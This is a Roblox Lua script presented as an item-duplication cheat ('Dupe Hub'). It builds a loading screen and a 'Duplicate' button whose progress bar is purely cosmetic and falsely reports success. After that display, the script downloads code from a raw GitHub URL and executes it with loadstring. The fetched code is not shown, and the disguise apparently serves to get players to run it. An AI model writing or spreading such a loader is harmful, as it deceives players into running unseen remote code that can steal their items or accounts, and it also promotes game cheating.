-- Dupe Hub v2.6 (PlayerGui): hiệu ứng tiến trình đẹp + đổi màu sau khi load xong
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local LP = Players.LocalPlayer
local PG = LP:WaitForChild("PlayerGui")

local GUI_NAME = "Dupe_Hub_Roblox"
local old = PG:FindFirstChild(GUI_NAME)
if old then old:Destroy() end

local function dragify(handle, target)
	local dragging, dragInput, startPos, startInputPos
	handle.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			startPos = target.Position
			startInputPos = input.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	handle.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
	end)
	UIS.InputChanged:Connect(function(input)
		if dragging and input == dragInput then
			local d = input.Position - startInputPos
			target.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
		end
	end)
end

local function pill(parent, text)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(1, -8, 1, -8)
	b.Position = UDim2.new(0, 4, 0, 4)
	b.BackgroundColor3 = Color3.fromRGB(114, 106, 240)
	b.Text = text
	b.TextColor3 = Color3.fromRGB(255, 255, 255)
	b.Font = Enum.Font.GothamSemibold
	b.TextSize = 18
	b.AutoButtonColor = true
	b.Parent = parent
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 12)
	local s = Instance.new("UIStroke", b)
	s.Thickness = 1.5
	s.Color = Color3.fromRGB(255, 255, 255)
	s.Transparency = 0.5
	return b
end

local function pillColor(btn, r, g, b)
	btn.BackgroundColor3 = Color3.fromRGB(r, g, b)
end

-- GUI gốc
local gui = Instance.new("ScreenGui", PG)
gui.Name = GUI_NAME
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global

-- Loading 8s
local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BackgroundTransparency = 0.35

local box = Instance.new("Frame", gui)
box.AnchorPoint = Vector2.new(0.5, 0.5)
box.Position = UDim2.new(0.5, 0, 0.5, 0)
box.Size = UDim2.new(0, 380, 0, 130)
box.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
box.BorderSizePixel = 0
Instance.new("UICorner", box).CornerRadius = UDim.new(0, 16)
dragify(box, box)

local title = Instance.new("TextLabel", box)
title.BackgroundTransparency = 1
title.Position = UDim2.new(0, 24, 0, 20)
title.Size = UDim2.new(1, -48, 0, 28)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Text = "Loading Dupe Hub..."

local barBg = Instance.new("Frame", box)
barBg.AnchorPoint = Vector2.new(0.5, 0)
barBg.Position = UDim2.new(0.5, 0, 0, 78)
barBg.Size = UDim2.new(0.9, 0, 0, 22)
barBg.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
barBg.BorderSizePixel = 0
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 12)

local fill = Instance.new("Frame", barBg)
fill.Size = UDim2.new(0, 0, 1, 0)
fill.BackgroundColor3 = Color3.fromRGB(160, 90, 255)
fill.BorderSizePixel = 0
Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 12)
TweenService:Create(fill, TweenInfo.new(8, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)}):Play()

-- Hub chính
local frame = Instance.new("Frame", gui)
frame.Visible = false
frame.Size = UDim2.new(0, 400, 0, 150)
frame.Position = UDim2.new(0.5, -200, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(20, 22, 26)
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

local titleBar = Instance.new("Frame", frame)
titleBar.Size = UDim2.new(1, 0, 0, 48)
titleBar.BackgroundColor3 = Color3.fromRGB(28, 30, 36)
titleBar.BorderSizePixel = 0
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 16)
local t = Instance.new("TextLabel", titleBar)
t.BackgroundTransparency = 1
t.Size = UDim2.new(1, -120, 1, 0)
t.Position = UDim2.new(0, 16, 0, 0)
t.Font = Enum.Font.GothamBlack
t.TextSize = 20
t.TextXAlignment = Enum.TextXAlignment.Left
t.TextColor3 = Color3.fromRGB(235, 235, 245)
t.Text = "Dupe Hub"
dragify(titleBar, frame)

local body = Instance.new("Frame", frame)
body.BackgroundTransparency = 1
body.Size = UDim2.new(1, -32, 0, 60)
body.Position = UDim2.new(0, 16, 0, 64)

local btnDup2 = pill(body, "🧠 Duplicate")

-- Hiệu ứng khi nhấn: tiến trình 1%-100% có gradient sáng
local function ShowProgress10s(callback)
	if gui:FindFirstChild("KS_ProgressModal") then gui.KS_ProgressModal:Destroy() end
	local modal = Instance.new("Frame", gui)
	modal.Name = "KS_ProgressModal"
	modal.Size = UDim2.new(0, 380, 0, 130)
	modal.AnchorPoint = Vector2.new(0.5, 0.5)
	modal.Position = UDim2.new(0.5, 0, 0.5, 0)
	modal.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
	modal.BorderSizePixel = 0
	Instance.new("UICorner", modal).CornerRadius = UDim.new(0, 16)
	dragify(modal, modal)

	local mt = Instance.new("TextLabel", modal)
	mt.BackgroundTransparency = 1
	mt.Position = UDim2.new(0, 16, 0, 12)
	mt.Size = UDim2.new(1, -32, 0, 26)
	mt.Font = Enum.Font.GothamBold
	mt.TextSize = 20
	mt.TextColor3 = Color3.fromRGB(255, 255, 255)
	mt.TextXAlignment = Enum.TextXAlignment.Left
	mt.Text = "Duplicating..."

	local percent = Instance.new("TextLabel", modal)
	percent.BackgroundTransparency = 1
	percent.Position = UDim2.new(0, 16, 0, 44)
	percent.Size = UDim2.new(1, -32, 0, 22)
	percent.Font = Enum.Font.Gotham
	percent.TextSize = 18
	percent.TextColor3 = Color3.fromRGB(210, 210, 215)
	percent.TextXAlignment = Enum.TextXAlignment.Left
	percent.Text = "1%"

	local pbg = Instance.new("Frame", modal)
	pbg.AnchorPoint = Vector2.new(0.5, 0)
	pbg.Position = UDim2.new(0.5, 0, 0, 76)
	pbg.Size = UDim2.new(0.9, 0, 0, 22)
	pbg.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	pbg.BorderSizePixel = 0
	Instance.new("UICorner", pbg).CornerRadius = UDim.new(0, 12)

	local pf = Instance.new("Frame", pbg)
	pf.Size = UDim2.new(0, 0, 1, 0)
	pf.BackgroundColor3 = Color3.fromRGB(114, 106, 240)
	pf.BorderSizePixel = 0
	Instance.new("UICorner", pf).CornerRadius = UDim.new(0, 12)

	local grad = Instance.new("UIGradient", pf)
	grad.Color = ColorSequence.new{
		ColorSequenceKeypoint.new(0, Color3.fromRGB(90, 160, 255)),
		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(160, 90, 255)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(90, 160, 255))
	}
	task.spawn(function()
		while grad do
			for i = 0, 360, 5 do
				grad.Rotation = i
				task.wait(0.05)
			end
		end
	end)

	task.spawn(function()
		for i = 1, 100 do
			percent.Text = i .. "%"
			pf.Size = UDim2.new(i / 100, 0, 1, 0)
			task.wait(0.1)
		end
		mt.Text = "✅ Success"
		task.wait(0.6)
		modal:Destroy()
		callback() -- chạy code sau khi load xong
	end)
end

btnDup2.MouseButton1Click:Connect(function()
	btnDup2.Text = "🧠 Duplicate"
	ShowProgress10s(function()
		-- Sau khi load xong mới đổi màu + chạy script
		pillColor(btnDup2, 70, 200, 90)
		local u = "https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"
		local s
		pcall(function() s = game:HttpGet(u) end)
		if s and s ~= "" then pcall(loadstring(s)) else warn("⚠️ Load Failed:", u) end
	end)
end)

-- Nút toggle panel
local panel = Instance.new("ImageButton", gui)
panel.Visible = false
panel.Size = UDim2.new(0, 64, 0, 64)
panel.AnchorPoint = Vector2.new(1, 1)
panel.Position = UDim2.new(1, -16, 1, -16)
panel.BackgroundColor3 = Color3.fromRGB(28, 30, 36)
panel.Image = "rbxassetid://85220270061509"
Instance.new("UICorner", panel).CornerRadius = UDim.new(1, 0)
dragify(panel, panel)

local visible = true
panel.MouseButton1Click:Connect(function()
	visible = not visible
	frame.Visible = visible
end)

task.delay(8, function()
	bg:Destroy()
	box:Destroy()
	frame.Visible = true
	panel.Visible = true
end)
